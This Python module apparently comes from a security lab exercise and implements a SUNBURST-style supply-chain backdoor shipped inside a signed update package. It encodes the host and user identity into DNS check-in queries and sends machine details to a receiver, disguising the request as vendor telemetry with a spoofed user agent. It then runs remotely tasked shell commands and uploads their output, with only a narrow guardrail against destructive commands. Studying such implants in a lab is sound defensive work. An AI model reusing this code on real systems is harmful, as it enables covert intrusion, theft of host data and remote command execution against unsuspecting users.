"""Orion Improvement Program support component for the Task 5 lab.

The supplier build ships this module inside the signed V3 package.  The update
agent extracts it, checks its digest against the manifest, and registers it as
a long-running service in its own process.  It reads the host identity
locally, builds the encoded check-in label, resolves the coordinator, and posts
task output back to the HTTP receiver.

Standard library only.  Nothing here imports the lab controller, and the module
never reports to the UI; the DNS and receiver logs are the evidence.

Run as: ``python3 orion_support.py <dns-ip> <http-port> <interval-seconds>``
"""

from __future__ import annotations

import base64
import binascii
import getpass
import hashlib
import json
import os
import platform
import random
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.request import ProxyHandler, Request, build_opener

FORMAT_VERSION = 1
MODE_DISABLED = 3
MODE_PASSIVE = 4
MODE_ACTIVE = 5

CHECKIN_SUFFIX = "checkin.orion-lab.test"
HANDOFF_NAME = "handoff.orion-lab.test"
PASSIVE_ADDRESS = "192.0.2.10"
ACTIVE_ADDRESS = "192.0.2.20"
KEY_MATERIAL = b"orion-improvement-program/v1"
MAX_HOSTNAME = 16
MAX_USERNAME = 10
MAX_RECORD = 39

START_DELAY_SECONDS = 3.0
DEFAULT_INTERVAL_SECONDS = 4.0
DEFAULT_DNS_IP = "10.0.0.3"
DEFAULT_HTTP_PORT = 9000

# Telemetry endpoint and agent string.  The request shape imitates the
# vendor's Improvement Program upload so the POST does not stand out against
# ordinary updater traffic; SUNBURST used the same trick.
TELEMETRY_PATH = "/swip/upd/orion.improvementprogram.asmx"
USER_AGENT = "Orion/2020.2.4 (Windows NT 10.0; Win64; x64)"
PROTOCOL_VERSION = "2020.2.4"

DANGEROUS_PATTERNS = (
    re.compile(r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+/(?:\s|$)"),
    re.compile(r"\b(mkfs|shutdown|reboot|poweroff|halt)\b"),
    re.compile(r"\bdd\b[^\n]*\bof=/dev/"),
    re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
)

OPENER = build_opener(ProxyHandler({}))


def _keystream(size: int) -> bytes:
    digest = hashlib.sha256(KEY_MATERIAL).digest()
    return (digest * (size // len(digest) + 1))[:size]


def _xor(value: bytes) -> bytes:
    return bytes(left ^ right for left, right in zip(value, _keystream(len(value))))


def _fit(value: str, limit: int, fallback: str) -> str:
    cleaned = "".join(character for character in value.lower() if character.isalnum() or character in "-.").strip("-.")
    if not cleaned:
        cleaned = fallback
    return cleaned[:limit]


def _uid(hostname: str, username: str) -> bytes:
    return hashlib.sha256(f"{hostname.lower()}|{username.lower()}".encode("utf-8")).digest()[:4]


def _record(hostname: str, username: str, mode: int) -> bytes:
    host = _fit(hostname, MAX_HOSTNAME, "host")
    user = _fit(username, MAX_USERNAME, "user")
    body = (
        bytes([FORMAT_VERSION, mode])
        + _uid(host, user)
        + bytes([len(host)])
        + host.encode("ascii")
        + bytes([len(user)])
        + user.encode("ascii")
    )
    record = body + binascii.crc_hqx(body, 0x1021).to_bytes(2, "big")
    if len(record) > MAX_RECORD:
        raise ValueError(f"encoded record is {len(record)} bytes, limit is {MAX_RECORD}")
    return record


def encode_label(hostname: str, username: str, mode: int = MODE_PASSIVE) -> str:
    """Return the leftmost DNS label for one check-in."""
    return base64.b32encode(_xor(_record(hostname, username, mode))).decode("ascii").rstrip("=").lower()


def build_query(hostname: str, username: str, mode: int = MODE_PASSIVE) -> str:
    return f"{encode_label(hostname, username, mode)}.{CHECKIN_SUFFIX}"


def _encode_name(name: str) -> bytes:
    parts = name.rstrip(".").split(".")
    return b"".join(bytes((len(part),)) + part.encode("ascii") for part in parts) + b"\0"


def _decode_name(packet: bytes, offset: int) -> tuple[str, int]:
    labels: list[str] = []
    next_offset = offset
    jumped = False
    visited: set[int] = set()
    wire_length = 1
    while True:
        if offset >= len(packet):
            raise ValueError("truncated DNS name")
        size = packet[offset]
        if size & 0xC0 == 0xC0:
            if offset + 1 >= len(packet):
                raise ValueError("truncated DNS pointer")
            pointer = ((size & 0x3F) << 8) | packet[offset + 1]
            if pointer >= len(packet) or pointer in visited or len(visited) >= 16:
                raise ValueError("invalid DNS compression pointer")
            visited.add(pointer)
            if not jumped:
                next_offset = offset + 2
            offset = pointer
            jumped = True
            continue
        if size & 0xC0:
            raise ValueError("unsupported DNS label encoding")
        offset += 1
        if size == 0:
            if not jumped:
                next_offset = offset
            break
        if size > 63:
            raise ValueError("oversized DNS label")
        end = offset + size
        if end > len(packet):
            raise ValueError("truncated DNS label")
        labels.append(packet[offset:end].decode("ascii"))
        wire_length += size + 1
        if wire_length > 255:
            raise ValueError("oversized DNS name")
        offset = end
    return ".".join(labels).lower(), next_offset


def query_dns(server_ip: str, name: str) -> tuple[int, list[tuple[int, str]]]:
    """Ask one A question and return (rcode, [(rrtype, value)])."""
    transaction_id = random.randrange(0, 65536)
    packet = struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
    packet += _encode_name(name) + struct.pack("!HH", 1, 1)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
        client.settimeout(2)
        client.sendto(packet, (server_ip, 53))
        response, _address = client.recvfrom(2048)
    if len(response) < 12:
        raise ValueError("short DNS response")
    response_id, flags, question_count, answer_count, _ns, _ar = struct.unpack("!HHHHHH", response[:12])
    if response_id != transaction_id:
        raise ValueError("DNS transaction ID mismatch")
    if not flags & 0x8000 or question_count != 1:
        raise ValueError("invalid DNS response header")
    question_name, offset = _decode_name(response, 12)
    if question_name != name.lower() or offset + 4 > len(response):
        raise ValueError("DNS question mismatch")
    offset += 4
    records: list[tuple[int, str]] = []
    for _ in range(min(answer_count, 16)):
        _owner, offset = _decode_name(response, offset)
        if offset + 10 > len(response):
            raise ValueError("truncated DNS answer")
        rrtype, _class, _ttl, rdlength = struct.unpack("!HHIH", response[offset : offset + 10])
        offset += 10
        rdata_offset = offset
        if offset + rdlength > len(response):
            raise ValueError("truncated DNS answer data")
        rdata = response[offset : offset + rdlength]
        offset += rdlength
        if rrtype == 1 and len(rdata) == 4:
            records.append((rrtype, socket.inet_ntoa(rdata)))
        elif rrtype == 5:
            target, target_end = _decode_name(response, rdata_offset)
            if target_end > rdata_offset + rdlength:
                raise ValueError("invalid CNAME answer length")
            records.append((rrtype, target))
    return flags & 0x000F, records


def _local_ip(receiver_ip: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        probe.connect((receiver_ip, 9))
        return probe.getsockname()[0]


def _identity(receiver_ip: str) -> dict[str, str]:
    hostname = socket.gethostname()
    username = getpass.getuser()
    ip = _local_ip(receiver_ip)
    return {
        "victim_id": "v-" + hashlib.sha256(f"{hostname}|{ip}".encode("utf-8")).hexdigest()[:12],
        "hostname": hostname,
        "username": username,
        "os": f"{platform.system()} {platform.release()}",
        "ip": ip,
        "version": "v3",
        "process": os.path.basename(sys.argv[0]) or "orion_support.py",
        "pid": str(os.getpid()),
        "arch": platform.machine(),
    }


def _telemetry(identity: dict[str, str], message_id: str) -> dict[str, object]:
    """Build the request body: an Improvement Program upload, not a beacon."""
    return {
        "version": PROTOCOL_VERSION,
        "messageId": message_id,
        "customerId": identity["victim_id"],
        "machineName": identity["hostname"],
        "userName": identity["username"],
        "domain": "orion-lab.test",
        "osVersion": identity["os"],
        "ipAddress": identity["ip"],
        "processName": identity["process"],
        "processId": identity["pid"],
        "architecture": identity["arch"],
        "clientVersion": identity["version"],
        "improvementProgram": {
            "enabled": True,
            "intervalSeconds": int(DEFAULT_INTERVAL_SECONDS),
        },
    }


def _post(base_url: str, value: dict[str, object]) -> dict[str, object]:
    request = Request(
        base_url.rstrip("/") + TELEMETRY_PATH,
        data=json.dumps(value).encode("utf-8"),
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": USER_AGENT,
        },
    )
    with OPENER.open(request, timeout=2) as response:
        body = response.read().decode("utf-8", errors="replace")
    try:
        reply = json.loads(body) if body else {}
    except json.JSONDecodeError:
        reply = {}
    return reply if isinstance(reply, dict) else {}


def _execute(task: dict[str, object], identity: dict[str, str]) -> dict[str, object]:
    command = task.get("command")
    task_id = task.get("task_id", "")
    result: dict[str, object] = {
        "task_id": task_id,
        "victim_id": identity["victim_id"],
        "hostname": identity["hostname"],
        "command": command if isinstance(command, str) else str(command),
        "exit_code": None,
        "output": "",
    }
    if not isinstance(command, str) or not command.strip() or len(command) > 1000:
        result["error"] = "invalid command"
        return result
    if any(pattern.search(command) for pattern in DANGEROUS_PATTERNS):
        result["error"] = "command blocked by lab guardrail"
        return result
    try:
        completed = subprocess.run(["/bin/sh", "-lc", command], capture_output=True, text=True, timeout=8)
    except (OSError, subprocess.SubprocessError) as exc:
        result["error"] = str(exc)
        return result
    output = (completed.stdout + completed.stderr).strip()
    result["exit_code"] = completed.returncode
    result["output"] = output[:6000] if output else "(no output)"
    return result


def _message_id() -> str:
    return os.urandom(8).hex()


def _beacon(dns_ip: str, http_port: int) -> None:
    handoff_rcode, handoff_answers = query_dns(dns_ip, HANDOFF_NAME)
    if handoff_rcode != 0 or not handoff_answers or handoff_answers[0][0] != 5:
        return
    receiver_name = handoff_answers[0][1]
    receiver_rcode, receiver_answers = query_dns(dns_ip, receiver_name)
    if receiver_rcode != 0 or not receiver_answers or receiver_answers[0][0] != 1:
        return
    receiver_ip = receiver_answers[0][1]
    identity = _identity(receiver_ip)
    base_url = f"http://{receiver_ip}:{http_port}"
    reply = _post(base_url, _telemetry(identity, _message_id()))
    swip = reply.get("swip")
    tasks = swip.get("tasks") if isinstance(swip, dict) else None
    if not isinstance(tasks, list):
        return
    for entry in tasks[:4]:
        if not isinstance(entry, dict) or entry.get("kind") != "command":
            continue
        task = {"task_id": entry.get("id"), "command": entry.get("value")}
        outcome = _execute(task, identity)
        upload = _telemetry(identity, _message_id())
        upload["telemetry"] = [{
            "id": task["task_id"],
            "kind": "command",
            "request": task["command"],
            "exitCode": outcome["exit_code"],
            "result": outcome["output"],
            "error": outcome.get("error"),
        }]
        _post(base_url, upload)


def _checkin(dns_ip: str, hostname: str, username: str, mode: int) -> tuple[int, list[tuple[int, str]]]:
    return query_dns(dns_ip, build_query(hostname, username, mode))


def run(dns_ip: str, http_port: int, interval: float) -> int:
    time.sleep(START_DELAY_SECONDS)
    hostname = socket.gethostname()
    username = getpass.getuser()
    mode = MODE_PASSIVE
    while True:
        try:
            rcode, answers = _checkin(dns_ip, hostname, username, mode)
        except (OSError, ValueError):
            time.sleep(interval)
            continue
        if rcode == 3:
            if mode == MODE_DISABLED:
                return 0
            mode = MODE_DISABLED
            try:
                _checkin(dns_ip, hostname, username, mode)
            except (OSError, ValueError):
                pass
            return 0
        if rcode != 0 or not answers or answers[0][0] != 1:
            time.sleep(interval)
            continue
        address = answers[0][1]
        if address == ACTIVE_ADDRESS:
            mode = MODE_ACTIVE
            try:
                _beacon(dns_ip, http_port)
            except (OSError, ValueError):
                pass
        elif address == PASSIVE_ADDRESS:
            mode = MODE_PASSIVE
        time.sleep(interval)


def main(argv: list[str]) -> int:
    dns_ip = argv[1] if len(argv) > 1 else DEFAULT_DNS_IP
    http_port = int(argv[2]) if len(argv) > 2 and argv[2].isdigit() else DEFAULT_HTTP_PORT
    try:
        interval = float(argv[3]) if len(argv) > 3 else DEFAULT_INTERVAL_SECONDS
    except ValueError:
        interval = DEFAULT_INTERVAL_SECONDS
    return run(dns_ip, http_port, max(interval, 1.0))


if __name__ == "__main__":
    sys.exit(main(sys.argv))
